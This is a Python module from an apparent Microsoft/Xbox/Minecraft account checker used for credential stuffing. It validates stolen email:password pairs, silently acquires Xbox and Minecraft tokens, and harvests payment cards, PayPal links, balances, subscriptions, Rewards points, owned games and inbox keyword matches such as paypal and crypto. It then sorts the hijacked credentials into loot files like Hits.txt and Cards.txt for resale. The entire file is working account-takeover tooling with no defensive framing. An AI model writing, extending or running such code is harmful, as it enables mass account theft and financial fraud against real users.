import os
import re
import threading
from .login import authenticate_with_token, get_delegate_token, get_rps_token
from .rewards import get_rewards_points
from .payment import get_payment_methods, get_account_balance
from .xbox import get_owned_games, get_game_pass_status
from .minecraft import check_minecraft_ownership, get_minecraft_profile, get_name_change_info, get_optifine_cape
from .inbox import search_inbox
from .hypixel import get_hypixel_stats, format_hypixel_capture
from .donutsmp import check_donut_smp, format_donut_capture, save_donut_stats
from ..file_handler import write_with_dedup, get_result_directory, save_cookies

_instance = None
_lock = threading.Lock()

_UA_ANDROID = "Mozilla/5.0 (Linux; Android 9; SM-G9880 Build/PQ3A.190705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Safari/537.36"
_UA_EDGE    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
_TIMEOUT = 15

class NovaFullCapture:
    pass

def get_novafullcapture():
    global _instance
    if _instance is None:
        with _lock:
            if _instance is None:
                _instance = NovaFullCapture()
    return _instance

def _get_country(session, delegate_token):
    def _2l(v):
        if v and isinstance(v, str):
            v = v.strip().upper()
            if len(v) == 2 and v.isalpha():
                return v
            if '-' in v and len(v) == 5:
                return v.split('-')[-1].upper()
        return None

    if delegate_token:
        try:
            r = session.get(
                'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/'
                'paymentInstrumentsEx?status=active,removed&language=en-GB',
                headers={
                    'User-Agent': _UA_ANDROID,
                    'Accept': 'application/json',
                    'Authorization': f'MSADELEGATE1.0="{delegate_token}"',
                    'Content-Type': 'application/json',
                },
                timeout=_TIMEOUT,
            )
            if r.status_code == 200:
                try:
                    data = r.json()
                    items = data if isinstance(data, list) else data.get('items', [])
                    for item in items:
                        c = _2l(item.get('country') or item.get('countryCode'))
                        if c: return c
                        addr = item.get('address') or {}
                        c = _2l(addr.get('country') or addr.get('countryCode'))
                        if c: return c
                except Exception:
                    pass
                for pat in [r'"country"\s*:\s*"([A-Z]{2})"', r'"countryCode"\s*:\s*"([A-Z]{2})"']:
                    m = re.search(pat, r.text)
                    if m:
                        c = _2l(m.group(1))
                        if c: return c
        except Exception:
            pass

    try:
        r = session.get(
            'https://account.live.com/API/GetSessionInfo',
            headers={'User-Agent': _UA_EDGE, 'Accept': 'application/json'},
            timeout=_TIMEOUT,
        )
        if r.status_code == 200:
            for pat in [r'"[Ll]ive[Cc]ountry"\s*:\s*"([A-Z]{2})"', r'"[Cc]ountry[Cc]ode"\s*:\s*"([A-Z]{2})"']:
                m = re.search(pat, r.text)
                if m:
                    c = _2l(m.group(1))
                    if c: return c
    except Exception:
        pass
    return 'N/A'

def _get_xbox_token_silent(session, access_token):
    import urllib.parse as _up
    try:
        xbox_auth_url = (
            'https://login.live.com/oauth20_authorize.srf'
            '?client_id=00000000402B5328&response_type=token'
            '&scope=service::user.auth.xboxlive.com::MBI_SSL'
            '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
        )
        r = session.get(xbox_auth_url, timeout=10, allow_redirects=True)
        frag = _up.parse_qs(_up.urlparse(r.url).fragment)
        tok = frag.get('access_token', [None])[0]
        if tok: return tok
        loc = r.headers.get('Location', '')
        if 'access_token=' in loc:
            return _up.unquote(loc.split('access_token=')[1].split('&')[0])
    except Exception:
        pass
    return access_token

def _mc_pipeline(session, xbox_rps_token, cfg):
    if not xbox_rps_token:
        return None, None, None, None

    for rps in [xbox_rps_token, 'd=' + xbox_rps_token]:
        try:
            xbl = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={
                    'Properties': {'AuthMethod': 'RPS', 'SiteName': 'user.auth.xboxlive.com', 'RpsTicket': rps},
                    'RelyingParty': 'http://auth.xboxlive.com', 'TokenType': 'JWT',
                },
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=int(cfg.get('timeout', 10)),
            )
            if xbl.status_code != 200:
                continue
            js = xbl.json()
            xbl_token = js.get('Token')
            uhs = js['DisplayClaims']['xui'][0]['uhs']
            if not xbl_token or not uhs:
                continue

            xsts = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={
                    'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbl_token]},
                    'RelyingParty': 'rp://api.minecraftservices.com/', 'TokenType': 'JWT',
                },
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=int(cfg.get('timeout', 10)),
            )
            if xsts.status_code != 200:
                continue
            xsts_token = xsts.json().get('Token')
            if not xsts_token:
                continue

            mc_r = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'},
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=int(cfg.get('timeout', 10)),
            )
            if mc_r.status_code == 200:
                mc_token = mc_r.json().get('access_token')
                return mc_token, xbl_token, uhs, xsts_token
        except Exception:
            continue
    return None, None, None, None

def capture_account(email, password, session, cfg=None, proxy_list=None):
    if cfg is None:
        cfg = {}

    status, access_token = authenticate_with_token(email, password, session)

    result = {
        'email': email,
        'password': password,
        'status': status,
        'mc_type': None,
        'mc_name': None,
        'mc_uuid': None,
        'mc_capes': [],
        'optifine_cape': None,
        'name_change_allowed': None,
        'hypixel': {},
        'donut': None,
        'points': '0',
        'lifetime_points': '0',
        'balance': '0',
        'country': 'N/A',
        'payment_methods': [],
        'subscriptions': [],
        'games': [],
    }

    if status not in ('HIT',):
        return result

    xbox_rps = _get_xbox_token_silent(session, access_token)
    mc_token, xbl_token, uhs, xsts_token = _mc_pipeline(session, xbox_rps, cfg)

    if mc_token:
        ownership = check_minecraft_ownership(session, mc_token)
        result['mc_type'] = ownership

        profile = get_minecraft_profile(session, mc_token)
        if profile:
            result['mc_name'] = profile.get('name', '')
            result['mc_uuid'] = profile.get('uuid', '')
            result['mc_capes'] = profile.get('capes', [])

        if cfg.get('check_optifine_cape', True) and result['mc_name']:
            result['optifine_cape'] = get_optifine_cape(session, result['mc_name'])

        if cfg.get('check_name_change', True) and result['mc_name']:
            nc = get_name_change_info(session, mc_token)
            if nc:
                result['name_change_allowed'] = nc.get('name_change_allowed')

    delegate_token = get_delegate_token(session)

    if cfg.get('check_rewards_points', True):
        pts, ltm = get_rewards_points(session)
        result['points'] = pts or '0'
        result['lifetime_points'] = ltm or '0'

    if cfg.get('check_payment', True):
        result['payment_methods'] = get_payment_methods(session, delegate_token)
        result['balance'] = get_account_balance(session, delegate_token)

    if cfg.get('check_subscriptions', True):
        result['subscriptions'] = get_game_pass_status(session, delegate_token)

    if cfg.get('check_country', True):
        result['country'] = _get_country(session, delegate_token)

    if cfg.get('check_xbox_games', True) and xbox_rps:
        result['games'] = get_owned_games(session, xbox_rps)

    if cfg.get('check_hypixel', True) and result['mc_name']:
        stats = get_hypixel_stats(session, result['mc_name'])
        result['hypixel'] = stats

    if cfg.get('check_donut_smp', False) and result['mc_name']:
        donut_data = check_donut_smp(
            result['mc_name'],
            proxy_list=proxy_list,
            api_key=cfg.get('donut_api_key', ''),
        )
        result['donut'] = donut_data

    if cfg.get('scan_inbox', False):
        keywords_raw = cfg.get('inbox_keywords', 'steam,epicgames,paypal,crypto,minecraft,roblox')
        keywords = [k.strip() for k in keywords_raw.split(',') if k.strip()]
        result['inbox'] = search_inbox(session, keywords, delegate_token)

    return result

def build_capture_string(capture_data):
    parts = []

    mc_type = capture_data.get('mc_type')
    mc_name = capture_data.get('mc_name', '')
    if mc_type:
        parts.append(f"[{mc_type}]")
    elif mc_name:
        parts.append('[MC]')

    if mc_name:
        parts.append(f"IGN:{mc_name}")

    ban = capture_data.get('ban_status')
    if ban == 'False':
        parts.append('[Unbanned]')
    elif ban and not str(ban).startswith('[Error]') and not str(ban).startswith('[Unchecked]'):
        parts.append('[Banned]')

    hypixel = capture_data.get('hypixel', {})
    hyp_str = format_hypixel_capture(hypixel)
    if hyp_str:
        parts.append(f"Hypixel: {hyp_str}")

    donut = capture_data.get('donut')
    donut_str = format_donut_capture(donut)
    if donut_str:
        parts.append(f"DonutSMP: {donut_str}")

    capes = capture_data.get('mc_capes', [])
    if capes:
        parts.append(f"Capes: {', '.join(capes)}")
    if capture_data.get('optifine_cape'):
        parts.append('[Optifine]')

    if capture_data.get('name_change_allowed'):
        parts.append('[NC Available]')

    pts = capture_data.get('points', '0')
    try:
        if int(pts) > 0:
            parts.append(f"Pts:{int(pts):,}")
    except (ValueError, TypeError):
        pass

    pm = capture_data.get('payment_methods', [])
    if pm:
        cc = [m['display'] for m in pm if m.get('type') == 'credit_card']
        pp = [m['display'] for m in pm if m.get('type') == 'paypal']
        if cc: parts.append(f"CC: {', '.join(cc)}")
        if pp: parts.append(f"PP: {', '.join(pp)}")

    subs = capture_data.get('subscriptions', [])
    if subs:
        parts.append(f"Sub: [{', '.join(subs)}]")

    parts.append(f"Country:{capture_data.get('country', 'N/A')}")
    parts.append(f"Games:{len(capture_data.get('games', []))}")

    return ' | '.join(parts) if parts else 'No Capture'

def determine_value(capture_data):
    pm = capture_data.get('payment_methods', [])
    pts = capture_data.get('points', '0')
    subs = capture_data.get('subscriptions', [])
    games = capture_data.get('games', [])
    mc_type = capture_data.get('mc_type')
    try:
        has_pts = int(pts) > 0
    except (ValueError, TypeError):
        has_pts = False
    return bool(pm) or bool(subs) or bool(games) or has_pts or bool(mc_type)

def save_results(email, password, capture_data, result_dir):
    cap_str = build_capture_string(capture_data)
    hit_line = f"{email}:{password} | {cap_str}"

    write_with_dedup(os.path.join(result_dir, 'Hits.txt'), hit_line)

    mc_type = capture_data.get('mc_type', '')
    if mc_type:
        if 'Ultimate' in mc_type:
            write_with_dedup(os.path.join(result_dir, 'XboxGamePassUltimate.txt'), hit_line)
        elif 'Game Pass' in mc_type:
            write_with_dedup(os.path.join(result_dir, 'XboxGamePass.txt'), hit_line)
        if 'Normal Minecraft' in mc_type or 'minecraft' in mc_type.lower():
            write_with_dedup(os.path.join(result_dir, 'NormalMinecraft.txt'), hit_line)

    country = capture_data.get('country', 'N/A')
    if country and country != 'N/A':
        write_with_dedup(os.path.join(result_dir, 'Countries', f'{country}.txt'), hit_line)

    if capture_data.get('payment_methods'):
        write_with_dedup(os.path.join(result_dir, 'Payment.txt'), hit_line)
        for m in capture_data['payment_methods']:
            if m.get('type') == 'credit_card':
                write_with_dedup(os.path.join(result_dir, 'Cards.txt'), f"{email}:{password} | {m['display']}")
            elif m.get('type') == 'paypal':
                write_with_dedup(os.path.join(result_dir, 'Cards.txt'), f"{email}:{password} | PayPal: {m['display']}")

    if capture_data.get('subscriptions'):
        write_with_dedup(os.path.join(result_dir, 'GamePass.txt'), hit_line)

    try:
        if int(capture_data.get('points', '0')) > 0:
            write_with_dedup(os.path.join(result_dir, 'Rewards.txt'), hit_line)
    except (ValueError, TypeError):
        pass

    if capture_data.get('name_change_allowed'):
        write_with_dedup(os.path.join(result_dir, 'Namechangeable.txt'), hit_line)

    ban = capture_data.get('ban_status')
    if ban == 'False':
        write_with_dedup(os.path.join(result_dir, 'Unbanned.txt'), hit_line)
    elif ban and not str(ban).startswith('[Error]') and not str(ban).startswith('[Unchecked]'):
        write_with_dedup(os.path.join(result_dir, 'Banned.txt'), hit_line)

    for game in capture_data.get('games', []):
        game_name = re.sub(r'[<>:"/\\|?*]', '', game.get('name', 'Unknown')).strip() or 'Unknown'
        write_with_dedup(os.path.join(result_dir, 'Games', f'{game_name}.txt'), f'{email}:{password}')

    inbox = capture_data.get('inbox', {})
    if inbox:
        for kw, count in inbox.items():
            if count and count > 0:
                safe_kw = re.sub(r'[^a-zA-Z0-9_]', '', kw)
                write_with_dedup(os.path.join(result_dir, 'Inboxes', f'{safe_kw}.txt'), f'{email}:{password}')

    if capture_data.get('donut') and capture_data.get('mc_name'):
        save_donut_stats(
            email, password,
            capture_data['mc_name'],
            capture_data['donut'],
            capture_data.get('ban_status'),
            result_dir,
        )
